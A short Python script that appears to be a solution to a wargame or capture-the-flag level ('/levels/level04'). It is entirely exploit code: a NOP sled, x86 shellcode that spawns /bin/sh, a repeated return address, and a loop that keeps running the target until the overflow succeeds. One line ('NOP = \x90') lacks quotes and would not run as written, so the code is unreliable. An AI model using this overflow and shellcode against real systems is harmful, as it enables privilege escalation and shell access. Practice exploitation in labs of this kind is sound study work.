import struct, subprocess

STACK = 0x0804857b
NOP = \x90
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
EXPLOIT = NOP * (1024 - len(SHELLCODE)) + SHELLCODE

stack_ptr = struct.pack("<I", STACK) * 500
array = "%s%s" % (EXPLOIT, stack_ptr)

while 1:
  subprocess.call(["/levels/level04", array])